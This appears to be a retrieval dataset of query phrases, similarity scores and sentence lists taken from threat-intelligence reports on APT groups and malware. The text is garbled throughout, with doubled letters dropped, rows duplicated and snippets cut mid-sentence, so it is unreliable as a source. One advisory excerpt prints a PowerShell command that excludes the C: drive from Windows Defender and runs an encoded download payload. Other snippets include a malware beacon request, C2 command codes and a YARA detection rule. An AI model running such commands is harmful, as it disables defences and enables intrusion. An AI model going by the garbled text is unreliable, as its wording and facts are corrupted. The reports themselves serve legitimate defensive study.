ada82bdfef2120b94a738f5131c478c2,and lateral movement/execution of files,0.7832306772332936,"['The trilions of signals we analyze Scope and scale of Dismantling Adresing dramaticaly increased the impact of their actions.', 'from our worldwide ecosystem of products and threat landscape cybercrime vulnerabilities While Rusia drove headlines, Iranian actors services reveal the ferocity, scope, and scale The volume of pasword To date, Microsoft 93% of our ransomware escalated their atacks folowing a transition of digital threats acros the globe.', 'Microsoft is atacks has risen to an removed more than incident response of presidential power, launching destructive taking action to defend our customers and estimated 921 atacks 10,0 domains used engagements revealed atacks targeting Israel, and ransomware and the digital ecosystem against these threats, every second a 74% by cybercriminals and insuficient controls hack-and-leak operations targeting critical and you can read about our technology that increase in just one year.', '60 used by nation on privilege aces and infrastructure in the United States.', 'China also identifies and blocks bilions of phishing state actors.', 'lateral movement.', 'increased its espionage eforts in Southeast atempts, identity thefts, and other threats to Asia and elsewhere in the global south, seking our customers.', 'to counter US influence and steal critical data and information.', 'Report The State of Nation State Devices and Cyber Influence Cyber Contributing 03 Microsoft Digital Defense Report 202 Introduction Cybercrime Threats Infrastructure Operations Resilience Teams Introduction by Tom Burt The state of cybercrime Nation state threats Continued Cybercriminals continue to act as sophisticated Nation state actors are launching increasingly profit enterprises.', 'Atackers are adapting and sophisticated cyberatacks designed to evade We also use legal and technical means to finding new ways to implement their techniques, detection and further their strategic priorities.', 'seize and shut down infrastructure used by increasing the complexity of how and where The advent of cyberweapon deployment in cybercriminals and nation state actors and notify they host campaign operation infrastructure.']"
496d5445444c69d7fe859920af34b1dd,and lateral movement/execution of files,0.7832306772332936,"['7 ThreatNedle instaler .', '8 ThreatNedle loader .', '9 ThreatNedle backdor .', '9 Post-exploitation phase .', '10 Credential gathering .', '1 Lateral movement .', '1 Overcoming network segmentation .', '1 Exfiltration .15 Atribution .', '17 Conection with DeathNote cluster .', '18 Conection with Operation ApleJeus .', '18 Conection with Bokcode cluster .']"
0cb31182c70e3c1900fee9f19cd10fb8,and lateral movement/execution of files,0.7832306772332936,"['HTP/S but included a secondary method, DNS tuneling, which does not function properly.', 'Shark DanBot, Shark, and Milan use both DNS, a comonality for OilRig backdors, and HTP/S, for net- has similar symptoms, where its primary comunication method uses DNS but has a non-functional work comunications with C&C servers.', 'Marlin, however, in a significant departure from typical OilRig HTP/S secondary option.', 'In a similar vein, the SMB lateral movement tol, when it atempts to de- tactics, techniques, and procedures, uses the OneDrive API for its C&C operations.', 'Post-compromise termine a remote systems vulnerability to EternalBlue, uses a hard-coded private IP adres that is activities include data colection (via browser-data theft, and a keyloger) and exfiltration, and also unlikely to ever identify a vulnerable system (unles that system has that specific private IP adres).', 'lateral movement.', 'Another teltale sign of OilRig is the creation and use of multiple folders in a backdors working Victims of the campaign include diplomatic organizations, technology companies, and medical directory that are used for uploading to, and downloading files from, the OilRig C&C server.', 'First organizations in Israel, Tunisia, and the United Arab Emirates (UAE).', 'documented in the ALMA backdor [24], we se DanBot, Shark, and Milan employing the same methodology.', 'We rarely se similar TPs from other groups.', 'ESET researchers observed two methods for initial aces: spearphishing and via the remote administration software ITbrain [19], which was found in conjunction with the remote aces tol Lastly, OilRig operators are wel known for using DNS as a C&C comunication chanel, while also TeamViewer.']"
3d2e99ba94188b71a17364073a49e3ea,the batch file,0.7514180536353627,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
3d2e99ba94188b71a17364073a49e3ea,batch file,0.7657437517555142,"['3.', 'OilRig (Iran) - OilRig is a suspected Iranian threat group that has targeted Midle Eastern and international victims since at least 2014.', 'The group has targeted a variety of sectors, including financial, government, energy, chemical, and telecomunications.', '4.', 'Sandman (China) - Sandman APT is likely asociated with suspected China-based threat clusters known to use the KEYPLUG backdor, in particular a cluster jointly presented by PwC and Microsoft at Labscon 2023 STORM-086/Red Dev 40.', '5.', 'Arid Viper (Palestine) - Arid Viper is an espionage-motivated cyber threat actor with Hamas- aligned interests.', ""Arid Viper's tolkit is multi-platform and includes the consistent use and develop- ment of mobile spyware since emerging in 2017."", 'Increased industry focus on Arid Viper is an extension of our continuing colective eforts to track threat actors engaged in the Israel-Hamas war.', 'SENTINELONE WATCHTOWER END OF YEAR 2023 18 Top Threats of 2023 by Operating System Windows There was no reduction in Windows malware and loaders in 2023.', ""Many comodity loaders were poly- morphic (change their hash on every execution) and suported atackers' hands-on-keyboard activities for information gathering, disabling security setings, and forging the way for ransomware atacks.""]"
dfef51232debe263923fa19689fef654,then deletes the registry key,0.851297421489152,"['First, the code that generates the file can be found in other Lazarus Group malware families and constitutes nearly 7% of the non-C .cab RunTime (CRT) library functions within the WhiskeyBravo-One executable.', 'Secondly, the end result is that the destruc- tion operation can give the impresion that the original selected file is recoverable if the user is able to crack the archives pasword.', 'This is a bit of a cruel joke to play on the victim by giving them a glimer of hope when, in actuality, the file is most definitely destroyed and atempting to recover the file via the archive would be fruitles and a waste of resources.', 'Operation Blockbuster: 19 Destructive Malware Report 3.2 WhiskeyBravoTwo WhiskeyBravo-Two is a simplified variant of WhiskeyBravo-One that removes the functionality from the dnsec.dat activation window determination code as wel as the archive functionality from the file destruction code.', 'WhiskeyBravo-Two expects the operation configuration file to be located at instead of .', '.', '%SYSDIR%\\TYEI08.DEP %SYSDIR%\\noise03dat The file destruction proces within WhiskeyBravo-Two focuses solely on overwriting the contents of a file and ignores the task of deleting the file.', 'This results in any file marked for destruction remaining on the victims file system, with the same file size, but with completely useles content.', 'Furthermore, WhiskeyBravo-Two removes the generation entirely.', 'The .cab removal of the generation, and the functions necesary for that operation, results in a significantly smaler binary .cab fotprint that consists of a total of 21 functions, 8 of which are made of the CRT library and 3 are administrative overhead (service related), leaving 10 functions responsible for the destructive functionality of the malware.', 'Operation Blockbuster: 20 Destructive Malware Report 4.']"
dfef51232debe263923fa19689fef654,then deletes the registry key,0.851297421489152,"['First, the code that generates the file can be found in other Lazarus Group malware families and constitutes nearly 7% of the non-C .cab RunTime (CRT) library functions within the WhiskeyBravo-One executable.', 'Secondly, the end result is that the destruc- tion operation can give the impresion that the original selected file is recoverable if the user is able to crack the archives pasword.', 'This is a bit of a cruel joke to play on the victim by giving them a glimer of hope when, in actuality, the file is most definitely destroyed and atempting to recover the file via the archive would be fruitles and a waste of resources.', 'Operation Blockbuster: 19 Destructive Malware Report 3.2 WhiskeyBravoTwo WhiskeyBravo-Two is a simplified variant of WhiskeyBravo-One that removes the functionality from the dnsec.dat activation window determination code as wel as the archive functionality from the file destruction code.', 'WhiskeyBravo-Two expects the operation configuration file to be located at instead of .', '.', '%SYSDIR%\\TYEI08.DEP %SYSDIR%\\noise03dat The file destruction proces within WhiskeyBravo-Two focuses solely on overwriting the contents of a file and ignores the task of deleting the file.', 'This results in any file marked for destruction remaining on the victims file system, with the same file size, but with completely useles content.', 'Furthermore, WhiskeyBravo-Two removes the generation entirely.', 'The .cab removal of the generation, and the functions necesary for that operation, results in a significantly smaler binary .cab fotprint that consists of a total of 21 functions, 8 of which are made of the CRT library and 3 are administrative overhead (service related), leaving 10 functions responsible for the destructive functionality of the malware.', 'Operation Blockbuster: 20 Destructive Malware Report 4.']"
564c219dc0a2c3edd2eed08025387d9d,enumerate files and folders,0.75450765529922,"['Nodachi: A previously unknown set of plugins uti- lized by SideCopy were caling Nodachi.', 'These Golang-based plugins have reconaisance and file-stealing abilities targeting an Indian multi-factor authentication ap known as Kavach.', 'RAT ANALYSIS CETARAT CetaRAT is a C#-based RAT family first sen in the wild since 2019.', 'Its malicious capabilities (Figure 8) include: Execution: Download and run arbitrary executables and comands.', 'Figure 8: CetaRAT comand codes.', 'File management: Upload, download, delete, rename and enumerate files.', 'Capture: Take screnshots and monitor clipboard data.', 'Proceses: List or kil proceses on the endpoint.', '2021 Cisco.', 'Al rights reserved.', 'talos-external@cisco.com | talosinteligence.com page 9 of 23 InSideCopy: How this APT continues to evolve its arsenal DETARAT DetaRAT is a previously unknown C#-based implant used by SideCopy.']"
f35c22043263d414403f1c3e0219fb06,The Scheduled Task was named RuntimeBrokerService.exe,0.8337058618796639,"['file.zip contained XMRig cryptocurency mining software and asociated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Asociated file.', 'This file can create a local user acount [T136.01] and tests for internet conectivity by pinging 8.8.8.8 [T1016.01].', 'The exploit payload created a Scheduled Task [T1053.05] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shel, the actors gained aces to a VMware service acount with administrator and system level aces.', 'The Scheduled Task was named RuntimeBrokerService.exe to masquerade as a legitimate Windows task.', 'Se MAR 10387061-1.v1 for aditional information, including IOCs, on these four files.', 'After obtaining initial aces and instaling XMRig on the VMWare Horizon server, the actors used RDP [T1021.01] and the built-in Windows user acount DefaultAcount [T1078.01] to move lateraly [TA08] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server asociated with 14.76.136[.]153.', 'The actors downloaded the folowing tols: PsExec a Microsoft signed tol for system administrators.']"
cae33c8970a53857dff6608fe8894b8a,created a Scheduled Task,0.8533587862785443,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
831832eeb4a24af3634965af422903e1,created a Scheduled Task,0.7579481921725693,"['The files created in this directory are shown in the screnshot below (Figure 2).', 'Figure 2.', 'Screnshot showing files droped by the MSI The task is executed at log on for any user.', 'Its purpose is to execute another legitimate executable (CameraSetingsUIHost.exe) with two arguments (18e190413af045db8dfbd29609eb87 and lion).', 'CameraSetingsUIHost.exe is a Microsoft file that asists with usage of a webcam on the system.', 'The created scheduled task can be sen in Figure 3.', '2/1 Figure 3.', 'Malicious scheduled task created by the malware It is in CameraSetingsUIHost.exe that the novel DL side-loading ocurs.', 'Novel DL Side-loading Technique Conventional DL Side-Loading As a quick primer, when an executable atempts to load a library (DL) in Windows, it wil lok for this library in a set order of locations.', 'This proces is documented by Microsoft here.', 'Therefore, by placing a malicious DL in the same folder as the caling aplication, an atacker can ensure it is loaded before a legitimate DL of the same name in the system directory.']"
853ef9a522c24e9428f28c1412c2f678,created a Scheduled Task,0.7837945256392667,"['On the victims side, the execution of an implant is neded; It cals back its Local Relay and starts the TCP/SOCKS5 tunel.', 'Figure 9.', 'Image taken from the Ligolo project documentation.', 'Comparing the new variant (Sockbot) to the original source code available online, the threat actors aded several execution checks to avoid multiple instances runing at the same time, defined the value of the Local Relay as a hard-coded string to avoid the ned of pasing comand line parameters when executing the atack and set the persistence via a scheduled task (Figure 10).', 'Figure 10.', 'Scheduled Task created by the atackers.', 'Our threat inteligence team is constantly loking for clues around the usage of this tol.', 'In adition, we would like to provide the readers with a Yara rule to detect this new threat, if neded.', 'Fel fre to share details with us in case you find related samples.', 'rule win_golang_tunel_ligolo_sockbot { meta: author = ""Felipe Duarte, Security Joes"" description = ""Detects Go binary Sockbot"" hash = ""7dc13eae4e15869024ec1fd2650e4f84d53dfa2d7d302f845cd94289fe5f2"" strings: $str1 = ""main.handleRelay"" $str2 = ""main.verifyTlsCertificate"" $str3 = ""main.FindProces"" $str4 = ""main.hideConsole"" $str5 = ""main.startSocksProxy"" $str6 = ""main.CreateSchedTask"" $str7 = ""main.relay"" $str8 = ""Conecting to relay server.""', '$str9 = ""Could not start SOCKS5 proxy !""']"
eac2de541445c9a60a2dc147bbc0e221,created a Scheduled Task,0.8204972261520745,"['The script wil initialy confirm an internet conection using WMIs Win32_PingStatus clas to ping htps:/w.gogle[.]com.', 'If sucesful, it wil run a batch file named 8lGghf8kIPIu3cM.bat.', 'The main task of the batch file 8lGghf8kIPIu3cM.bat is to drop files that wil further unpack and create a scheduled task for the payload.', 'The batch file wil create more scripts that wil cary out these subtasks: unz.vbs is used for decompresing the executable out from the archive into the same directory unzFile.vbs creates unz.vbs 2L7uZQboJBhTERK.bat is just for chaining; runs unzFile.vbs then runs 2BYretPBD4iSQKYS.bat 2BYretPBD4iSQKYS.bat is just for chaining; runs unz.vbs then runs d.bat d.bat creates a scheduled task of the unpacked payload (conhost.exe) then runs e.bat e.bat deletes itself and the other scripts created by 8lGghf8kIPIu3cM.bat The batch file named d.bat creates a scheduled task to atain another persistent execution of the malware on the target machine.', 'The scheduled task is named ConsoleHostManager as sen in the below screnshot.', 'Screnshot for Scheduled Task created.', 'Netskope Detection Netskope Advanced Threat Protection provides proactive coverage against zero-day and APT samples of malicious Ofice documents using both our static analysis engines and cloud sandbox.', 'The folowing screnshot shows the detection for e2a3edc7080163164728de85f0c39, indicating it was detected by Netskope Cloud Sandbox, Netskope Advanced Heuristic Engine, and Netskope Threat Inteligence.', '7/8 Conclusions Malware writen in uncomon programing languages puts the security comunity at a disadvantage as researchers and reverse enginers unfamiliarity can hamper their investigation.', 'Nim is one of the young programing languages increasingly abused by malware authors.', 'Aside from its familiar syntax, its cros-compilation features alow atackers to write one malware variant and have it cros-compiled to target diferent platforms.']"
f35c22043263d414403f1c3e0219fb06,the actors leveraged RDP to propagate to several hosts within the network.,0.853934506371565,"['Mimikatz a credential theft tol.', 'Ngrok a reverse proxy tol for proxying an internal service out onto an Ngrok domain, which the user can then aces at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tol in use by some comercial products for benign purposes; however, this proces bypases typical firewal controls and may be a potentialy unwanted aplication in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator acount [T136.02].', 'Using the newly created acount, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon loging into each host, the actors manualy disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.', 'The threat actors were able to implant Ngrok on multiple hosts to ensure Ngroks persistence should they lose aces to a machine during a routine rebot.', 'The actors were able to proxy [T1090] RDP sesions, which were only observable on the local network as outgoing HTPS port 43 conections to tunel.us.ngrok[.', ']com and korgn.su.lenut[.', ']com Page 3 o f 14 | Product ID: A2-320A TLP:CLEAR TLP:CLEAR CISA | FBI ` (the prior domain in reverse).']"
f35c22043263d414403f1c3e0219fb06,The threat actors then executed Mimikatz on VDI-KMS to harvest credentials,0.7698075711497729,"['Test your technologies against the technique.', '4.', 'Analyze your detection and prevention technologies performance.', '5.', 'Repeat the proces for al security technologies to obtain a set of comprehensive performance data.', '6.', 'Tune your security program, including people, proceses, and technologies, based on the data generated by this proces.', 'CISA and FBI recomend continualy testing your security program, at scale, in a production environment to ensure optimal performance against the MITRE AT&CK techniques identified in this advisory.', 'REFERENCES [1] MITRE AT&CK Version 12: Software Ngrok Page 14 of 14 | Product ID: A2-320A TLP:CLEAR']"
f35c22043263d414403f1c3e0219fb06,Ngrok – a reverse proxy tool for proxying an internal service out onto an Ngrok domain,0.793924495429223,"['After obtaining initial aces and instaling XMRig on the VMWare Horizon server, the actors used RDP [T1021.01] and the built-in Windows user acount DefaultAcount [T1078.01] to move lateraly [TA08] to a VMware VDI-KMS host.', 'Once the threat actor established themselves on the VDI-KMS host, CISA observed the actors download around 30 megabytes of files from transfer[.', ']sh server asociated with 14.76.136[.]153.', 'The actors downloaded the folowing tols: PsExec a Microsoft signed tol for system administrators.', 'Mimikatz a credential theft tol.', 'Ngrok a reverse proxy tol for proxying an internal service out onto an Ngrok domain, which the user can then aces at a randomly generated subdomain at *.ngrok[.]io.', 'CISA has observed this tol in use by some comercial products for benign purposes; however, this proces bypases typical firewal controls and may be a potentialy unwanted aplication in production environments.', 'Ngrok is known to be used for malicious purposes.', '[1] The threat actors then executed Mimikatz on VDI-KMS to harvest credentials and created a rogue domain administrator acount [T136.02].', 'Using the newly created acount, the actors leveraged RDP to propagate to several hosts within the network.', 'Upon loging into each host, the actors manualy disabled Windows Defender via the Graphical User Interface (GUI) and implanted Ngrok executables and configuration files.']"
f35c22043263d414403f1c3e0219fb06,The exploit payload then downloaded mdeploy.text,0.8010785675340003,"['including PsExec, Mimikatz, and Ngrok.', 'INCIDENT RESPONSE If suspected initial aces or compromise is detected based on IOCs or TPs in this CSA, CISA encourages organizations to asume lateral movement by threat actors and investigate conected systems and the DC.', 'CISA recomends organizations aply the folowing steps before aplying any mitigations, including patching.', '1.', 'Imediately isolate afected systems.', '2.', 'Colect and review relevant logs, data, and artifacts.', 'Take a memory capture of the device(s) and a forensic image capture for detailed analysis.', 'Page 1 of 14 | Product ID: A2-320A TLP:CLEAR TLP:CLEAR CISA | FBI ` 3.', 'Consider soliciting suport from a third-party incident response organization that can provide subject mater expertise to ensure the actor is eradicated from the network and to avoid residual isues that could enable folow-on exploitation.', '4.']"
f35c22043263d414403f1c3e0219fb06,removed mde.ps1 from the disk,0.8400849968018017,"[']2 lasting 17.6 seconds.', 'The actors exploit payload ran the folowing PowerShel comand [T1059.01] that aded an exclusion tol to Windows Defender [T1562.01]: powershel try{AdMpPreference ExclusionPath \'C:\\\'; WriteHost \'aded exclusion\'} catch {WriteHost \'adingexclusionfailed\' }; powershel enc ""$BASE64 encoded payload to download next stage and execute it"" Page 2 o f 14 | Product ID: A2-320A TLP:CLEAR TLP:CLEAR CISA | FBI ` The exclusion tol alowlisted the entire c:\\drive, enabling threat actors to download tols to the c:\\drive without virus scans.', 'The exploit payload then downloaded mdeploy.text from 182.54.217[.', ']2/mdepoy.txt to C:\\users\\public\\mde.ps1 [T105].', 'When executed, mde.ps1 downloaded file.zip from 182.54.217[.', ']2 and removed mde.ps1 from the disk [T1070.04].', 'file.zip contained XMRig cryptocurency mining software and asociated configuration files.', 'WinRing0x64.sys XMRig Miner driver wuacltservice.exe XMRig Miner config.json XMRig miner configuration RuntimeBroker.exe Asociated file.', 'This file can create a local user acount [T136.01] and tests for internet conectivity by pinging 8.8.8.8 [T1016.01].', 'The exploit payload created a Scheduled Task [T1053.05] that executed RuntimeBroker.exe daily as SYSTEM.', 'Note: By exploiting Log4Shel, the actors gained aces to a VMware service acount with administrator and system level aces.']"
6e351b37df2368bfe750f22e48b4c330,$BASE64 encoded payload,0.7503369598979573,"['Figure 2.', ""PDB-paths discovered inside Prikormka's DOWNLOADER module."", 'DOWNLOADER module CORE module The main purpose of this component is to download the CORE module and ex- ecute it.', 'The DOWNLOADER module makes an HTP request to one of its C&C The CORE module is responsible for comunications with C&C servers and other servers, receives data, decrypts the data, saves it under the name hauthuid.dl tasks, including downloading aditional modules, loading them, and uploading and then loads the DL.', 'The comunication is encrypted with the Blowfish cipher stolen data to the remote server.', 'and then base64 encoded.', 'Since this malware (and specificaly the CORE module) has existed for several years, the details of implementation might vary, but the main concept of the CORE module has remained unchanged over the years.', 'The concept of the Prikormka malware is simple: the CORE module downloads aditional components, which are used to harvest various types of data.', 'When such a component is loaded, it gathers sensitive information and saves this information to some specific log file.', 'The log file might store colected data in plain-text or it may be encrypted.', 'The CORE module checks periodicaly for such log files and when a log is available, it uploads it to the remote server.']"
6e351b37df2368bfe750f22e48b4c330,$BASE64 encoded payload,0.7503369598979573,"['Figure 2.', ""PDB-paths discovered inside Prikormka's DOWNLOADER module."", 'DOWNLOADER module CORE module The main purpose of this component is to download the CORE module and ex- ecute it.', 'The DOWNLOADER module makes an HTP request to one of its C&C The CORE module is responsible for comunications with C&C servers and other servers, receives data, decrypts the data, saves it under the name hauthuid.dl tasks, including downloading aditional modules, loading them, and uploading and then loads the DL.', 'The comunication is encrypted with the Blowfish cipher stolen data to the remote server.', 'and then base64 encoded.', 'Since this malware (and specificaly the CORE module) has existed for several years, the details of implementation might vary, but the main concept of the CORE module has remained unchanged over the years.', 'The concept of the Prikormka malware is simple: the CORE module downloads aditional components, which are used to harvest various types of data.', 'When such a component is loaded, it gathers sensitive information and saves this information to some specific log file.', 'The log file might store colected data in plain-text or it may be encrypted.', 'The CORE module checks periodicaly for such log files and when a log is available, it uploads it to the remote server.']"
9cd7c673b04415e320b2ceea1c818934,$BASE64 encoded payload,0.7993247410519722,"['The exploitation method used in this campaign relies upon a remote Ofice template injection method, a technique that we have sen state actors use recently.', 'However, it is not uncomon to use tols such as EvilClipy to manipulate the behavior of Microsoft Ofice documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and efort.', 'This method wil generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embeded into the documents (i.e.', 'double base64 encoded payload).', 'Further maping these techniques acros the MITRE AT&CK framework enables us to visualize diferent techniques the adversary used to exploit their victims.', 'MITRE AT&CK maping for malicious documents These Microsoft Ofice templates are hosted on a comand and control server and the downloaded link is embeded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-2 Fighter Jet Program Defense, Space and Security (DS) Photovoltaics for space solar cels Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Enginer System Enginer Profesional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recomendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the atack in the early stages.']"
9cd7c673b04415e320b2ceea1c818934,$BASE64 encoded payload,0.7993247410519722,"['The exploitation method used in this campaign relies upon a remote Ofice template injection method, a technique that we have sen state actors use recently.', 'However, it is not uncomon to use tols such as EvilClipy to manipulate the behavior of Microsoft Ofice documents.', 'For example, threat actors can use pre-built kits to manipulate clean documents and embed malicious elements; this saves time and efort.', 'This method wil generate a consistent format that can be used throughout campaigns.', 'As a result, we have observed a consistency with how some of the malicious elements are embeded into the documents (i.e.', 'double base64 encoded payload).', 'Further maping these techniques acros the MITRE AT&CK framework enables us to visualize diferent techniques the adversary used to exploit their victims.', 'MITRE AT&CK maping for malicious documents These Microsoft Ofice templates are hosted on a comand and control server and the downloaded link is embeded in the first stage malicious document.', 'The job postings from these lure documents are positions for work with specific US defense programs and groups: F-2 Fighter Jet Program Defense, Space and Security (DS) Photovoltaics for space solar cels Aeronautics Integrated Fighter Group Military aircraft modernization programs Like previous operations, the adversary is using these lures to target individuals, likely posing as a recruiter or someone involved in recruitment.', 'Some of the job postings we have observed: Senior Design Enginer System Enginer Profesional networks such as LinkedIn could be a place used to deliver these types of job descriptions.', 'Defensive Architecture Recomendations Defeating the tactics, techniques and procedures utilized in this campaign requires a defense in depth security architecture that can prevent or detect the atack in the early stages.']"
1bf88955d9c2fb42a0ccbd31a4c920ea,$BASE64 encoded payload,0.7557919721484367,"['Figure 1 shows how malware sent via LinkedIn can infect a host.', 'Figure 1: Flow of malware infection The file sent via LinkedIn is compresed in RAR format and, when extracted, contains a Windows Help file (CHM file).', 'When this file is executed, it downloads and executes an external Windows Instaler file (MSI file).', 'The executed MSI file uses a PowerShel script to download and execute an aditional MSI file (Administrator-a214051.msi in Figure 1; the file name is [user name of the user who executed it]-a[5 random digits]1.msi).', 'This MSI file has the ability to send information about infected hosts, and the information is sent by HTP POST request as shown below.', 'The information is Base64 encoded.', 'POST /test.msi HTP/1.1 Conection: Kep-Alive Content-Type: aplication/x-w-form-urlencoded Acept: */* Acept-Language: ja-JP User-Agent: Mozila/4.0 (compatible; Win32; WinHtp.WinHtpRequest.5) Content-Length: [Size] Host: [Server name] VGltZToJV2VkIERl(.)', 'Figure 2 shows a part of the malware code for colecting information about the infected host.', 'You can se that it is writen in JScript.', '1/7 Figure 2: Part of the malware code In adition, we have confirmed that the LinkedIn acounts that contact the target send malware disguising themselves as those who ofer jobs.', 'Figure 3 shows the LinkedIn acount that contacted a target, and we consider it had ben compromised by the atacker.']"
c1a6e5479ff0c7dee5e31542140c9cb3,sends it to the C2 server.,0.7657791778330683,"['REDBUL Sets cafe flag to 1 active.', 'SLOWCOW Sets cafe flag to 0 slow mode.', 'Runs specified proces and logs its output, then prepares this output log for X uploading to the C2.', 'T Obtains list of files from a specific directory.', 'TAUTH Obtains list of files of remote server if specified credentials are valid.', 'G Sends a file to the C2.', 'GAUTH Downloads a particular file from a shared resource if specified credentials 4/6 are valid.', 'SPLIT Splits file into 40 KB parts and uploads them to the C2.', 'FLUSH Sends file with the data colected by al components that day and deletes it.', 'C1 C4 Sets the C2 in its configuration in the registry (C1-C4).', 'TL1 TL3 Sets the active state in its configuration in the registry (T1-T3).']"
ce06e9983253a40a71827e5dd84e4f2c,decrypts the Orchestrator,0.7513565271863145,"['ESET Research White Paper / May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Mathieu Faou TABLE OF CONTENTS 1.', 'Executive Sumary .', '.', '.', '.', '.', '.', '.']"
ce06e9983253a40a71827e5dd84e4f2c,decrypts the Orchestrator,0.7513565271863145,"['ESET Research White Paper / May 2020 FROM AGENT.BTZ TO COMRAT V4 A ten-year journey Mathieu Faou TABLE OF CONTENTS 1.', 'Executive Sumary .', '.', '.', '.', '.', '.', '.']"
41d6e1e379006c93e59f114b3161977e,The decryption key,0.9815703126742608,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,The decryption key,0.9815703126742608,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
06ad03af992ee4bf81718d3b4027aa57,injecting code,0.8374887967826388,"['19 3 DISTRIBUTION .', '24 3.1 THE LNK EXPLOIT .', '24 3.1.1 Propagation via External Storage Devices .', '27 3.1.2 Metasploit and WebDAV Exploit .', '27 3.1.3 What Do DL Hijacking Flaws and the LNK Exploit have in Comon?', '.', '28 3.2 LNK VULNERABILITY IN STUXNET .', '29 3.3 THE MS10-061 ATACK VECTOR .', '31 3.4 NETWORK SHARED FOLDERS AND RPC VULNERABILITY (MS08-067) .', '34 3.5 0-DAY IN WIN32K.SYS (MS10-073) .', '35 3.6 MS10-092: EXPLOITING A 0-DAY IN TASK SCHEDULER .']"
06ad03af992ee4bf81718d3b4027aa57,injecting code,0.8374887967826388,"['19 3 DISTRIBUTION .', '24 3.1 THE LNK EXPLOIT .', '24 3.1.1 Propagation via External Storage Devices .', '27 3.1.2 Metasploit and WebDAV Exploit .', '27 3.1.3 What Do DL Hijacking Flaws and the LNK Exploit have in Comon?', '.', '28 3.2 LNK VULNERABILITY IN STUXNET .', '29 3.3 THE MS10-061 ATACK VECTOR .', '31 3.4 NETWORK SHARED FOLDERS AND RPC VULNERABILITY (MS08-067) .', '34 3.5 0-DAY IN WIN32K.SYS (MS10-073) .', '35 3.6 MS10-092: EXPLOITING A 0-DAY IN TASK SCHEDULER .']"
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
88d674726f92a0b205d41f6b44c23d24,computer name,0.9939697234121188,[]
